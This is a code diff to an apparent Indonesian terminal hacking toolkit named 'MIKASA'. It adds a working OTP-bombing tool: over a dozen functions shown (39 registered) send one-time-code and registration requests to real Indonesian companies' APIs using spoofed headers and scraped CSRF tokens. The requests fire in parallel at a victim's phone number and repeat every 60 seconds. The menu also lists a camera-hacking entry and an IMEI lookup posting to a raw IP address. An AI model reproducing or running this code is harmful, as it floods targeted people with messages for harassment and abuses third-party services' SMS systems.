+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
+        }
+        
+        payload = {"phone": nomor_lokal}
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+def spam_otp_liva(nomor):
+     try:
+
+        if nomor.startswith('0'):
+            nomor = '62' + nomor[1:]
+        elif nomor.startswith('+62'):
+            nomor = nomor[1:]
+        elif not nomor.startswith('62'):
+            nomor = '62' + nomor
+
+
+        device_id = str(uuid.uuid4())
+        device_name = random.choice(['Samsung', 'Xiaomi', 'Realme', 'Oppo', 'Vivo', 'OnePlus'])
+
+        url = 'https://cms-2f7gt694.liva-auto.id/api/public/auth-ada/send-otp'
+        headers = {
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'no-store',
+            'content-type': 'application/json',
+            'origin': 'https://liva-auto.id',
+            'referer': 'https://liva-auto.id/',
+            'user-agent': random.choice([
+                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36'
+            ]),
+            'x-app-version': '1.9.259',
+            'x-device-id': device_id,
+            'x-device-name': device_name,
+            'x-platform': 'web'
+        }
+        payload = {
+            'phoneNumber': nomor
+        }
+
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+
+     except Exception as e:
+        return False
+
+def spam_otp_daihatsu(nomor):
+     try:
+
+        if nomor.startswith('0'):
+            nomor = '62' + nomor[1:]
+        elif nomor.startswith('+62'):
+            nomor = nomor[1:]
+        elif not nomor.startswith('62'):
+            nomor = '62' + nomor
+
+        session = requests.Session()
+        resp_page = session.get(
+            'https://www.astra-daihatsu.id/register',
+            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
+            timeout=10
+        )
+
+        import re
+        csrf_match = re.search(r'CSRFToken.*?value=\"([^\"]+)\"', resp_page.text)
+        if not csrf_match:
+            return False
+        csrf = csrf_match.group(1)
+
+        headers = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'content-type': 'application/json; charset=UTF-8',
+            'csrftoken': csrf,
+            'origin': 'https://www.astra-daihatsu.id',
+            'referer': 'https://www.astra-daihatsu.id/register',
+            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin'
+        }
+
+        resp = session.post(
+            'https://www.astra-daihatsu.id/otp/whatsapp/generate',
+            json={'phoneNo': nomor},
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def spam_otp_kreditpintar(nomor):
+     try:
+        if nomor.startswith('0'):
+            nomor = '+62' + nomor[1:]
+        elif nomor.startswith('62'):
+            nomor = '+' + nomor
+        elif not nomor.startswith('+62'):
+            nomor = '+62' + nomor
+
+        uuid_val = str(__import__('uuid').uuid4())
+        session = requests.Session()
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'id',
+            'content-type': 'application/json',
+            'origin': 'https://go.kreditpintar.com',
+            'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'x-adv-market-channel': 'OfficialWebsite',
+            'x-adv-uuid': uuid_val,
+            'x-app-version': 'APPVERSION_NAME(9999)',
+            'x-os-type': 'WEB',
+            'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'
+        }
+
+        resp = session.post(
+            'https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id',
+            json={'mobileNumber': nomor, 'type': 'SMS'},
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def spam_otp_internetrakyat(nomor):
+     try:
+        if nomor.startswith('62'):
+            nomor = '0' + nomor[2:]
+
+        session = requests.Session()
+        headers = {
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json',
+            'Origin': 'https://internetrakyat.id',
+            'Referer': 'https://internetrakyat.id/auth/register',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'x-api-key': '280999!FTTH'
+        }
+
+        resp = session.post(
+            'https://internetrakyat.id/api/app/auth/send-otp-register',
+            json={'phone_number': nomor},
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def spam_otp_pinjamduit(nomor):
+     try:
+        if nomor.startswith('62'):
+            nomor = '0' + nomor[2:]
+
+
+        session = requests.Session()
+        BASE = 'https://api.pinjamduit.co.id'
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': BASE,
+            'Referer': BASE + '/h5/download_selfmedia.html'
+        }
+
+        r1 = session.post(
+            BASE + '/gw/loan/credit-user/checkPhoneWeb',
+            headers=headers,
+            data={
+                'phone': nomor,
+                'mobilePhone': nomor,
+                'uuid': str(uuid.uuid4()),
+                'deviceId': 'wh',
+                'appMarket': 'web',
+                'appVersion': '99.99.99',
+                'clientType': 'w',
+                'ts': int(time.time() * 1000)
+            },
+            timeout=10
+        )
+
+        res1 = r1.json()
+        if res1.get('code') != '0':
+            return False
+
+        wybs = res1['data']['wybs']
+        sms_useage = 10 if res1['data']['isExist'] == 1 else 0
+
+        headers2 = headers.copy()
+        headers2['ss'] = wybs
+
+        r2 = session.post(
+            BASE + '/gw/loan/credit-user/checkPhoneNext',
+            headers=headers2,
+            data={
+                'phone': nomor,
+                'mobilePhone': nomor,
+                'sms_service': 2,
+                'sms_useage': sms_useage,
+                'deviceId': 'wh',
+                'appMarket': 'web',
+                'appVersion': '99.99.99',
+                'clientType': 'w',
+                'ts': int(time.time() * 1000)
+            },
+            timeout=10
+        )
+
+        res2 = r2.json()
+        return res2.get('code') == '0'
+
+     except Exception:
+        return False
+
+def spam_otp_isellershop(nomor):
+     try:
+        if nomor.startswith('62'):
+            nomor = '0' + nomor[2:]
+
+        headers = {
+            'accept': '*/*',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://warungyeahbintan.isellershop.com',
+            'referer': 'https://warungyeahbintan.isellershop.com/register',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-sat': 'oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+        }
+
+        resp = requests.post(
+            'https://warungyeahbintan.isellershop.com/services/identity/requestOTP',
+            headers=headers,
+            data={'destination': nomor, 'otpLength': '10'},
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def spam_otp_greensm(nomor):
+     try:
+        if nomor.startswith('0'):
+            nomor = '+62' + nomor[1:]
+        elif nomor.startswith('62'):
+            nomor = '+' + nomor
+        elif not nomor.startswith('+62'):
+            nomor = '+62' + nomor
+
+        headers = {
+            'accept': '*/*',
+            'content-type': 'application/json',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+        }
+
+        payload = {
+            'HiringSource': 'Iklan di surat kabar atau dalam aplikasi',
+            'Education': 's2',
+            'WorkExperience': 'Sopir komersial',
+            'City': 'BT',
+            'Type': 'CAR_SHARING',
+            'Tel': nomor,
+            'Name': 'Budi Santoso',
+            'Country': 'ID',
+            'ReferralCode': '',
+            'Source': '',
+            'AffiliateNumber': '',
+            'Campaign': ''
+        }
+
+        resp = requests.post(
+            'https://gapi.indo.greensm.com/car/acquisition/create-registration',
+            headers=headers,
+            json=payload,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def spam_otp_tiptip(nomor):
+     try:
+        if nomor.startswith('0'):
+            nomor = '+62' + nomor[1:]
+        elif nomor.startswith('62'):
+            nomor = '+' + nomor
+        elif not nomor.startswith('+62'):
+            nomor = '+62' + nomor
+
+        import uuid
+        rid = str(uuid.uuid4())[:8]
+
+        headers = {
+            'accept': 'application/json',
+            'channel': 'WEB',
+            'channel-app-version': '2.27.6',
+            'channel-device': 'Chrome',
+            'channel-fingerprint': '19e4f5f07caab3x9k2-mn7pq4r1-7c34742a-6ddd0-19e4f5f07cbx9k2mn',
+            'channel-fingerprint-additional': 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6',
+            'content-type': 'application/json',
+            'country-code': 'ID',
+            'language': 'id',
+            'request-id': rid,
+            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'origin': 'https://tiptip.id',
+            'referer': 'https://tiptip.id/sign-up'
+        }
+
+        payload = {
+            'action': 'SIGN_UP',
+            'delivery_method': 'WA',
+            'phone_number': nomor
+        }
+
+        resp = requests.post(
+            'https://api.tiptip.id/authentication/guest/v1/phone/otp/send',
+            headers=headers,
+            json=payload,
+            timeout=10
+        )
+
+        return resp.status_code == 200
+
+     except Exception:
+        return False
+
+def spam_otp_dokterin(nomor):
+     try:
+        if nomor.startswith('62'):
+            nomor_format = nomor
+        elif nomor.startswith('0'):
+            nomor_format = '62' + nomor[1:]
+        else:
+            nomor_format = '62' + nomor
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Content-Type': 'application/json',
+            'Origin': 'https://partner.dokterin.co.id',
+            'Referer': 'https://partner.dokterin.co.id/',
+            'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJXZWIgQnJvd3NlciIsImRlc2NyaXB0aW9uIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0Ny4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidGltZXpvbmUiOiJBc2lhL0pha2FydGEifQ==',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'cross-site',
+            'Connection': 'keep-alive'
+        }
+
+        payload = {
+            'phone': nomor_format,
+            'tnc_accept': True,
+            'device': 'Blink',
+            'platform': 'web',
+            'host': 'https://partner.dokterin.co.id'
+        }
+
+        resp = requests.post(
+            'https://api.dokterin.id/user/v1/users/login',
+            json=payload,
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+
+     except Exception:
+        return False
+
+def mulai_spam(nomor):
+     global cooldown_otp, stop_cooldown
+    
+     apis = {
+        "1": spam_otp_adiraku,
+        "2": spam_otp_tokopedia,
+        "3": spam_otp_singa,
+        "4": spam_otp_pinhome,
+        "5": spam_otp_duniagames,
+        "6": spam_otp_acc,
+        "7": spam_otp_absenku,
+        "8": spam_otp_saturdays,
+        "9": spam_otp_maulagi,
+        "10": spam_otp_bliblitiket,
+        "11": spam_otp_matahari,
+        "12": spam_otp_rumah123,
+        "13": spam_otp_halodoc,
+        "14": spam_otp_misteraladin,
+        "15": spam_otp_paper,
+        "16": spam_otp_planetban,
+        "17": spam_otp_bunda,
+        "18": spam_otp_bonusbelanja,
+        "19": spam_otp_hijup,
+        "20": spam_otp_alodokter,
+        "21": spam_otp_ohsome,
+        "22": spam_otp_optikmelawai,
+        "23": spam_otp_hollandbakery,
+        "24": spam_otp_hashmicro,
+        "25": spam_otp_tuneup,
+        "26": spam_otp_ultramilk,
+        "27": spam_otp_kaniva,
+        "28": spam_otp_jembatani,
+        "29": spam_otp_rcx,
+        "30": spam_otp_sahabatteknisi,
+        "31": spam_otp_liva,
+        "32": spam_otp_daihatsu,
+        "33": spam_otp_kreditpintar,
+        "34": spam_otp_internetrakyat,
+        "35": spam_otp_pinjamduit,
+        "36": spam_otp_isellershop,
+        "37": spam_otp_greensm,
+        "38": spam_otp_tiptip,
+        "39": spam_otp_dokterin
+    }
+     hasil = {}
+     with ThreadPoolExecutor(max_workers=len(apis)) as executor:
+        futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
+        for future in as_completed(futures):
+            nama = futures[future]
+            try:
+                hasil[nama] = future.result()
+            except:
+                hasil[nama] = False
+    
+     berhasil = sum(1 for v in hasil.values() if v)
+     gagal = len(hasil) - berhasil
+    
+     print(f"{G}─────────────────────────────────────────────────────────────{N}")
+     print(f"{G}  HASIL PENGIRIMAN OTP{N}")
+     print(f"{G}─────────────────────────────────────────────────────────────{N}")
+     print(f"  {W}Total {G}Berhasil {W}: {G}{berhasil}{N}")
+     print(f"  {W}Total {R}Gagal   {W}: {R}{gagal}{N}")
+     print(f"{G}─────────────────────────────────────────────────────────────{N}")
+    
+    # Set cooldown 60 detik
+     with cooldown_lock:
+        cooldown_otp = time.time() + 60
+    
+     print(f"""{Y} 
 █▀ █▀█ █░ █▀▄ █▀█ █░█░█ █▄░█
 █▄ █▄█ █▄ █▄▀ █▄█ ▀▄▀▄▀ █░▀█ {N}""")
-        print(f"{Y}[!] Cooldown 60 detik. Kirim otomatis ulang setelah selesai.{N}")
-        print(f"{Y}[!] Tekan ENTER untuk kembali ke MIKASA (keluar dari spam){N}")
-        print()
-        
-        # Timer cooldown dengan deteksi ENTER
-        stop_cooldown = False
-        import sys, select
-        
-        for i in range(60, 0, -1):
-            if stop_cooldown:
-                break
-            # Cek input tanpa blocking
-            if select.select([sys.stdin], [], [], 0)[0]:
-                cmd = sys.stdin.readline().strip()
-                if cmd == "":
-                    stop_cooldown = True
-                    break
-            
-            print(f"{Y}[⏳] Sisa {i} detik... (Tekan ENTER untuk kembali){N}", end="\r")
-            time.sleep(1)
-        
-        print("\n" + " " * 70 + "\r", end="")
-        
+     print(f"{Y}[!] Cooldown 60 detik. Kirim otomatis ulang setelah selesai.{N}")
+     print(f"{Y}[!] Tekan ENTER untuk kembali ke MIKASA (keluar dari spam){N}")
+     print()
+    
+    # Timer cooldown dengan deteksi ENTE
+     stop_cooldown = False
+     import sys, select
+    
+     for i in range(60, 0, -1):
         if stop_cooldown:
-            print(f"{Y}[!] Kembali ke MIKASA...{N}")
-            time.sleep(1)
             break
+        if select.select([sys.stdin], [], [], 0)[0]:
+            cmd = sys.stdin.readline().strip()
+            if cmd == "":
+                stop_cooldown = True
+                break
         
-        # Jika tidak ditekan ENTER, lanjut spam lagi
-        print(f"{G}[✓] Cooldown selesai! Mengirim ulang OTP...{N}\n")
+        print(f"{Y}[⏳] Sisa {i} detik... (Tekan ENTER untuk kembali){N}", end="\r")
         time.sleep(1)
-        # Loop berlanjut ke spam berikutnya
+    
+     print("\n" + " " * 70 + "\r", end="")
+    
+     if stop_cooldown:
+        print(f"{Y}[!] Kembali ke MIKASA...{N}")
+        time.sleep(1)
+        return  # BALIK KE MENU
+    
+    # Kalo ga ditekan ENTER, spam ulang
+     print(f"{G}[✓] Cooldown selesai! Mengirim ulang OTP...{N}\n")
+     time.sleep(1)
+     mulai_spam(nomor)
+
+def tool_otp_spam():
+    global cooldown_otp, stop_cooldown
+    os.system('clear')
+    
+   
+    with cooldown_lock:
+        sisa = cooldown_otp - time.time()
+        if sisa > 0:
+            print(f"{R}─────────────────────────────────────────────────────────────{N}")
+            print(f"""
+{R}╔═╗╔═╦══╦╗╔═╦═══╦═══╦═══╗
+{R}║║╚╝║╠╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║
+{R}║╔╗╔╗║║║║╚╝╝║║─║║╚══╣║─║║
+{R}║║║║║║║║║╔╗║║╚═╝╠══╗║╚═╝║
+{R}║║║║║╠╣╠╣║║╚╣╔═╗║╚═╝║╔═╗║
+{R}╚╝╚╝╚╩══╩╝╚═╩╝─╚╩═══╩╝─╚╝ {N}""")
+            print(f"{R}  Tunggu {Y}{int(sisa)} detik{R} sebelum spam lagi{N}")
+            print(f"{R}─────────────────────────────────────────────────────────────{N}")
+            print()
+            
+            stop_cooldown = False
+            import sys, select
+            
+            for i in range(int(sisa), 0, -1):
+                if stop_cooldown:
+                    break
+                if select.select([sys.stdin], [], [], 0)[0]:
+                    cmd = sys.stdin.readline().strip()
+                    if cmd == "":
+                        stop_cooldown = True
+                        break
+                print(f"{Y}[⏳] Sisa {i} detik...{N}", end="\r")
+                time.sleep(1)
+            
+            print("\n" + " " * 50 + "\r", end="")
+            
+            if stop_cooldown:
+                print(f"{Y}[!] Kembali ke MIKASA...{N}")
+                time.sleep(1)
+                return
+            
+            print(f"{G}[✓] Cooldown selesai!{N}")
+            time.sleep(1)
+            # LANJUT KE BAWAH
+    
+    print(f"""
+{R}─────────────────────────────────────────────────────────────{N}
+{R}  {W}                                     {R}│{N}  {R}  -••••{N}
+{R}  {W}█▀ █▀█ ▄▀█ █▀▄▀█                     {R}│{N}  {R} -••••••{N}
+{R}  {W}▄█ █▀▀ █▀█ █░▀░█                     {R}│{N}  {R}-••  ••••{N}
+{R}  {W}█▀█ ▀█▀ █▀█                          {R}│{N}  {R}-••    ••••{N}
+{R}  {W}█▄█ ░█░ █▀▀                          {R}│{N}  {R}-••••  ••••••{N}
+{R}  {W}                                     {R}│{N}  {R} -••••••••••{N}
+{R}  {W}AUTHOR = Rullzz06{N}                    {R}│{N}  {R}   -••••••{N}
+{R}─────────────────────────────────────────────────────────────{N}  
+{R}  {Y}📌 Contoh Format nomor:{N}
+{R}    {W}08xxxxxxxxxx{N}
+{R}    {W}628xxxxxxxxxx{N}
+{R}    {W}+628xxxxxxxxxx{N}
+{R}─────────────────────────────────────────────────────────────{N}
+{R}  {Y}💡 Masukkan nomor target, atau {R}ENTER {Y}untuk kembali{N}
+{R}─────────────────────────────────────────────────────────────{N}
+ """)
+    
+    nomor = input(f"{R}┌──({P}MIKASA{R})-[{C}OTP{R}]\n└─{R}${N} ").strip()
+    
+    if not nomor:
+        print(f"{Y}[!] Kembali ke MIKASA...{N}")
+        time.sleep(1)
+        return
+    
+    # Format nomor
+    if nomor.startswith("0"):
+        nomor = "62" + nomor[1:]
+    elif nomor.startswith("+"):
+        nomor = nomor[1:]
+    elif not nomor.startswith("62"):
+        nomor = "62" + nomor
+    
+    print(f"\n{G}[+] Target: +{nomor}{N}")
+    print(f"{Y}[+] Mengirim OTP...{N}")
+    mulai_spam(nomor)
+    time.sleep(10)
     
 def tool_Hack_camera():
     os.system('clear')
@@ -1263,11 +2266,267 @@ def tool_encryptor():
     os.system('clear')
     print(f"{Y}[!] File Encryptor - Dalam pengembangan{N}")
     input("Tekan ENTER...")
+ 
+def tool_imei_checker():
+    API_IMEI_URL = "http://46.247.108.15:3011/cekimei"
+    HASIL_FOLDER = "hasil_cek"
 
-def tool_password_cracker():
-    os.system('clear')
-    print(f"{Y}[!] Password Cracker - Dalam pengembangan{N}")
-    input("Tekan ENTER...")
+    if not os.path.exists(HASIL_FOLDER):
+        os.makedirs(HASIL_FOLDER)
+
+    H = '\033[92m'        # Hijau
+    K = '\033[1;33m'      # Kuning
+    P = '\033[1;37m'      # Putih
+    RESET = '\033[0m'
+
+    def format_imei_result(data, imei):
+        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
+        
+        if isinstance(data, dict):
+            merk = data.get("merk", "Tidak diketahui")
+            tipe = data.get("tipe", "Tidak diketahui")
+            status = data.get("status", "Tidak diketahui")
+            imei_status = data.get("imei_status", "Tidak diketahui")
+            network = data.get("network", "Tidak diketahui")
+            region = data.get("region", "Tidak diketahui")
+            country = data.get("country", "Tidak diketahui")
+            city = data.get("city", "Tidak diketahui")
+            isp = data.get("isp", "Tidak diketahui")
+            ip = data.get("ip", "Tidak diketahui")
+            device_model = data.get("device_model", "Tidak diketahui")
+            device_brand = data.get("device_brand", "Tidak diketahui")
+            device_year = data.get("device_year", "Tidak diketahui")
+            device_ram = data.get("device_ram", "Tidak diketahui")
+            device_storage = data.get("device_storage", "Tidak diketahui")
+            device_camera = data.get("device_camera", "Tidak diketahui")
+            device_battery = data.get("device_battery", "Tidak diketahui")
+            device_os = data.get("device_os", "Tidak diketahui")
+            device_cpu = data.get("device_cpu", "Tidak diketahui")
+            device_gpu = data.get("device_gpu", "Tidak diketahui")
+            device_screen = data.get("device_screen", "Tidak diketahui")
+            device_price = data.get("device_price", "Tidak diketahui")
+        else:
+            merk = tipe = status = imei_status = network = region = country = city = isp = ip = "Tidak diketahui"
+            device_model = device_brand = device_year = device_ram = device_storage = device_camera = device_battery = "Tidak diketahui"
+            device_os = device_cpu = device_gpu = device_screen = device_price = "Tidak diketahui"
+        
+        if "valid" in str(status).lower() or "active" in str(status).lower():
+            status_color = H
+        elif "invalid" in str(status).lower() or "blocked" in str(status).lower():
+            status_color = '\033[91m'
+        else:
+            status_color = K
+        
+        return f"""
+{H}┌────────────────────────────────────────────────────────────┐
+{H}│{P}                   📱 HASIL CEK IMEI 📱                 {H}│
+{H}├────────────────────────────────────────────────────────────┤
+{H}│{P}  ────────[ {H}INFORMASI DEVICE {P}]────────{H}           │
+{H}│  {P}🆔 IMEI        : {K}{imei}{P}                          │
+{H}│  {P}📱 Merk        : {K}{merk}{P}                          │
+{H}│  {P}📱 Tipe        : {K}{tipe}{P}                          │
+{H}│  {P}📊 Status      : {status_color}{status}{P}              │
+{H}│  {P}📊 IMEI Status : {status_color}{imei_status}{P}         │
+{H}│{P}  ────────[ {H}JARINGAN & LOKASI {P}]────────{H}        │
+{H}│  {P}📡 Network     : {K}{network}{P}                       │
+{H}│  {P}🌍 Region      : {K}{region}{P}                        │
+{H}│  {P}🏳️ Country     : {K}{country}{P}                       │
+{H}│  {P}🏙️ City        : {K}{city}{P}                          │
+{H}│  {P}🔌 ISP         : {K}{isp}{P}                           │
+{H}│  {P}🌐 IP Address  : {K}{ip}{P}                            │
+{H}│{P}  ────────[ {H}SPESIFIKASI DEVICE {P}]────────{H}       │
+{H}│  {P}📱 Model       : {K}{device_model}{P}                  │
+{H}│  {P}🏷️ Brand       : {K}{device_brand}{P}                  │
+{H}│  {P}📅 Tahun Rilis : {K}{device_year}{P}                   │
+{H}│  {P}🧠 RAM         : {K}{device_ram}{P}                    │
+{H}│  {P}💾 Storage     : {K}{device_storage}{P}                │
+{H}│  {P}📸 Camera      : {K}{device_camera}{P}                 │
+{H}│  {P}🔋 Battery     : {K}{device_battery}{P}                │
+{H}│  {P}💻 OS          : {K}{device_os}{P}                     │
+{H}│  {P}⚙️ CPU         : {K}{device_cpu}{P}                    │
+{H}│  {P}🎮 GPU         : {K}{device_gpu}{P}                    │
+{H}│  {P}📺 Screen      : {K}{device_screen}{P}                 │
+{H}│  {P}💰 Price       : {K}{device_price}{P}                  │
+{H}├────────────────────────────────────────────────────────────┤
+{H}│  {P}🕐 Waktu Cek   : {K}{now}{P}                          │
+{H}├────────────────────────────────────────────────────────────┤
+{H}│{K}  💾 Tersimpan di: {P}{HASIL_FOLDER}/imei_{imei}_{now[:10]}.txt{H}│
+{H}└────────────────────────────────────────────────────────────┘
+"""
+
+    def simpan_hasil_imei(jenis, input_data, response_data, success, formatted_result):
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f'{timestamp}_{jenis}'
+        
+        json_file = os.path.join(HASIL_FOLDER, f'{filename}.json')
+        hasil = {
+            'waktu_cek': datetime.now().isoformat(),
+            'jenis_cek': jenis,
+            'input': input_data,
+            'success': success,
+            'response': response_data
+        }
+        with open(json_file, 'w', encoding='utf-8') as f:
+            json.dump(hasil, f, indent=2, ensure_ascii=False)
+        
+        txt_file = os.path.join(HASIL_FOLDER, f'{filename}.txt')
+        with open(txt_file, 'w', encoding='utf-8') as f:
+            f.write(formatted_result)
+        
+        return json_file, txt_file
+
+    def cek_imei(imei):
+        try:
+            headers = {'Content-Type': 'application/json'}
+            payload = {'imei': imei}
+            
+            print(f"{K}┌────────────────────────────────────────────────────────────┐{RESET}")
+            print(f"{K}│{P}  🔍 Sedang mengecek IMEI...                          {K}│{RESET}")
+            print(f"{K}└────────────────────────────────────────────────────────────┘{RESET}")
+            
+            for i in range(3):
+                sys.stdout.write(f"\r{K}  {'█' * (i+1)}{'░' * (2-i)}  {i+1}/3{RESET}")
+                sys.stdout.flush()
+                time.sleep(0.5)
+            print()
+            
+            response = requests.post(API_IMEI_URL, json=payload, headers=headers, timeout=10)
+            response.raise_for_status()
+            data = response.json()
+            
+            formatted = format_imei_result(data, imei)
+            json_file, txt_file = simpan_hasil_imei('imei', imei, data, True, formatted)
+            
+            return {
+                'success': True,
+                'data': data,
+                'formatted': formatted,
+                'json_file': json_file,
+                'txt_file': txt_file
+            }
+        except Exception as e:
+            error_data = {'error': str(e)}
+            formatted = f"""
+{K}┌────────────────────────────────────────────────────────────┐
+{K}│{P}                   ❌ ERROR CEK IMEI ❌                 {K}│
+{K}├────────────────────────────────────────────────────────────┤
+{K}│  {P}Error: {K}{str(e)}{P}                                    │
+{K}└────────────────────────────────────────────────────────────┘
+"""
+            json_file, txt_file = simpan_hasil_imei('imei', imei, error_data, False, formatted)
+            return {
+                'success': False,
+                'error': str(e),
+                'formatted': formatted,
+                'json_file': json_file,
+                'txt_file': txt_file
+            }
+
+    def lihat_history_imei():
+        os.system('clear')
+        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
+        print(f"{H}  {P}📜 HISTORY PENGECEKAN IMEI{RESET}")
+        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
+        
+        if not os.path.exists(HASIL_FOLDER):
+            print(f"{K}📂 Belum ada history.{RESET}")
+            input(f"\n{K}Tekan Enter untuk kembali...{RESET}")
+            return
+        
+        files = [f for f in os.listdir(HASIL_FOLDER) if f.endswith('.txt') and 'imei' in f]
+        files = sorted(files, reverse=True)
+        
+        if not files:
+            print(f"{K}📂 Belum ada history pengecekan IMEI.{RESET}")
+            input(f"\n{K}Tekan Enter untuk kembali...{RESET}")
+            return
+        
+        print(f"\n{P}No  | File{RESET}")
+        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
+        for i, file in enumerate(files[:20], 1):
+            filepath = os.path.join(HASIL_FOLDER, file)
+            waktu = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
+            print(f"{P}{i:<3} | {file[:40]:<40} | {waktu}{RESET}")
+        
+        print(f"{H}────────────────────────────────────────────────────────────{RESET}")
+        print(f"{K}💡 Hasil tersimpan di folder {H}{HASIL_FOLDER}/{RESET}")
+        input(f"\n{K}Tekan Enter untuk kembali...{RESET}")
+
+    def banner_imei():
+        os.system('clear')
+        print(f"""
+{H}    ██╗███╗   ███╗███████╗██
+{H}    ██║████╗ ████║██╔════╝██
+{H}    ██║██╔████╔██║█████╗  ██
+{H}    ██║██║╚██╔╝██║██╔══╝  ██
+{H}    ██║██║ ╚═╝ ██║███████╗██
+{H}    ╚═╝╚═╝     ╚═╝╚══════╝
+{H}┌────────────────────────────────────────────────────────────┐
+{H}│{P}  🔍 Cek keaslian dan status IMEI device               {H}│
+{H}│{K}  📋 Hasil otomatis tersimpan di folder {H}hasil_cek{K}       {H}│
+{H}├────────────────────────────────────────────────────────────┤
+{H}│                                                            │
+{H}│  {P}[{K}1{P}] Cek IMEI                                      │
+{H}│  {P}[{K}2{P}] Lihat History Pengecekan                        │
